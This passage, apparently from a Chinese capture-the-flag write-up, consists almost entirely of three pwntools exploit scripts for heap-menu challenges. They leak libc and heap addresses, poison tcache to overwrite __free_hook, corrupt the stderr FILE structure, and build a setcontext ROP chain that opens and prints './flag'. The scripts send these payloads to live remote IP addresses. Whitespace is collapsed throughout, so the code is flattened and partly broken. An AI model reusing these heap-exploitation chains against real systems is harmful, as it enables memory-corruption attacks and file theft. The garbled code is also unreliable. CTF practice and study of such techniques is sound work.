 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('39.106.13.71',35272) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
 def choice(a): io.sendlineafter('Your choice:',str(a))
 def add(a,b): choice(1) io.sendlineafter('Index: ',str(a)) io.sendlineafter('Size: ',str(b)) def edit(a,b): choice(2) io.sendlineafter('Index: ',str(a)) io.sendafter('Content: ',b)
 def show(a): choice(3) io.sendlineafter('Index: ',str(a))
 def delete(a): choice(4) io.sendlineafter('Index: ',str(a))
 add(0,0xf8) add(1,0x68) add(2,0x88) add(3,0x68) add(4,0x88) add(5,0xf8) for i in range(7): add(6+i,0xf8)
 for i in range(7): delete(6+6-i)
 delete(0) edit(4,'0'*0x80*8+'0'*8*1+'11000000'+'0'*8*6+'0')
 def code(a): m='' for i in range(64): if a%2==1: m+='1' else: m+='0' a=a//2
 return m
 delete(5) delete(3) delete(1) add(0,0x130) show(0) libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['__malloc_hook']-96-0x10-0x3f0 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] pop_rdi_ret_addr=libc.search(asm('pop rdi;ret')).next() pop_rdx_rsi_ret_addr=libc.search(asm('pop rdx;pop rsi;ret')).next() pop_rax=libc.search(asm('pop rax;ret')).next() syscall_ret=libc.search(asm('syscall;ret')).next()
 edit(0,'0'*0xf8*8+code(0x71)+code(free_hook_addr)) add(6,0xf8) add(7,0xf8) show(6) io.recvuntil('Content: ') heap_base=u64(io.recv(6)+'x00x00')-0x100
 pay=code(u64('./flagx00x00')) pay=pay.ljust(0x68*8,'0') #pading 0x68 pay+=code(3) #rdi rdi+0x68 pay+=code(0) #rsi rdi+0x70 pay+='0'*8*0x10 #pading 0x88 pay+=code(0) #rdx rdi+0x88 pay+='0'*8*0x10 #pading 0xa0 pay+=code(heap_base+0x100) #rsp rdi+0xa0 pay+=code(pop_rax) #rip rdi+0xa8 pay=pay.ljust(0x800,'0') pay+=code(10000) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(heap_base) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0) pay+=code(0) pay+=code(pop_rax) pay+=code(2) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(3) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0x100) pay+=code(heap_base+0x490) pay+=code(pop_rax) pay+=code(0) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(1) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0x100) pay+=code(heap_base+0x490) pay+=code(pop_rax) pay+=code(1) pay+=code(syscall_ret)
 edit(6,pay[:0xf0*8]) edit(7,pay[0x100*8:])
 add(1,0x68) add(3,0x68) edit(3,code(libc.sym['setcontext']+53)) delete(6) success('libc_base:'+hex(libc_base)) # success('heap_base:'+hex(heap_base))
 gdb_attach(io,gdb_text)    io.interactive() # except Exception as e: # io.close() # continue # else:  #   continue
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./leak'#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' telescope $rebase(0x2143a0) 16 '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/glibc/x64/2.27/lib/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('47.95.3.91',16282) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
 def choice(a): io.sendlineafter('Your choice: ',str(a))
 def add(a,b): choice(1) io.sendlineafter('Index: ',str(a)) io.sendlineafter('Size: ',str(b)) def edit(a,b): choice(2) io.sendlineafter('Index: ',str(a)) io.sendafter('Content: ',b)
 def delete(a): choice(3) io.sendlineafter('Index: ',str(a))

 add(0,0x1000) add(15,0x1000) delete(15) delete(0) add(1,0x20) add(2,0x20) add(3,0x60) add(4,0x40) add(5,0x1000) edit(0,'x00'*0x28+p64(0x501)+'x00'*0x28+p64(0x51)+(p64(0)+p64(0x21))*0x6+p64(0)+p64(0x61)+(p64(0)+p64(0x21))*0x60) delete(3) delete(4) edit(0,'x00'*0x28+p64(0x501)+'x00'*0x28+p64(0x51)+(p64(0)+p64(0x21))*0x6+p64(0)+p64(0x61)+(p64(0)+p64(0x21))*0x60) delete(2) delete(3) delete(4) add(6,0x20) add(7,0x60) add(10,0x450) edit(3,p64((libc.sym['_IO_2_1_stderr_']&0xfff)+0x1000)[:2]) add(8,0x40) add(9,0x40) edit(4,p64((libc.sym['_IO_2_1_stderr_']&0xfff)+libc.sym['__free_hook']-libc.sym['_IO_2_1_stderr_']+0x58+0x1000)[:2]) add(11,0x50) add(12,0x50) edit(12,p64(0x123450)) edit(0,'x00'*0x28+p64(0x3001-(0xe00*2)+0xc0)+'x00'*0x28+p64(0x3001-(0xe00*2)+0xd0)+(p64(0)+p64(0x21))*0x6+p64(0)+p64(0x61)+(p64(0)+p64(0x21))*0xd0) edit(15,(p64(0)+p64(0x21))*0xd0)
 delete(2) delete(3) edit(9,p64(0xfbad1887)+p64(0)*3+'x00') add(13,0x20) gdb_attach(io,gdb_text) io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./queue'#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' telescope $rebase(0x202040) 16 '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('101.201.71.136',14927) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
 def choice(a): io.sendlineafter(': ',str(a))
 def add(a): choice(1) io.sendlineafter('Size: ',str(a)) def edit(a,b,c): choice(2) io.sendlineafter('Index: ',str(a)) io.sendlineafter('Value idx:',str(b)) io.sendlineafter('Value: ',str(c))
 def show(a,b): choice(3) io.sendlineafter('Index: ',str(a)) io.sendlineafter('Num: ',str(b))
 def delete(a): choice(4) io.sendlineafter('Index:',str(a))
 def waigua(a,c): choice(666) io.sendlineafter('Index: ',str(a)) io.sendafter('Content: ',c)
 for i in range(10): add(0x20)
 waigua(0,'x00'*0x10+'x48') show(0,8) io.recvuntil('Content: ') data='' for i in range(6): a=io.recvuntil('n',drop=True) if len(a)=='1': a='0'+a data=a+data heap_addr=int(data,16)
 addr=heap_addr-0x15D8 waigua(0,'x00'*0x10+p64(addr)) show(0,8) io.recvuntil('Content: ') data='' for i in range(6): a=io.recvuntil('n',drop=True) if len(a)=='1': a='0'+a data=a+data
 leak=int(data,16)
 libc_base=leak-(0x3EBCA0) libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook']
 waigua(0,'x00'*0x10+p64(free_hook_addr)*2)
 one=libc_base+0xe54f7 for i in range(6): edit(0,i,(one>>(8*i))&0xff)
 choice(4) success('libc_base:'+hex(libc_base)) # success('heap_base:'+hex(heap_base)) gdb_attach(io,gdb_text) io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1667289155.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1667289157.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1667289158.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1667289159.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1667289160.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1667289161.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1667289161.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1667289162.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1667289163.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1667289164.png)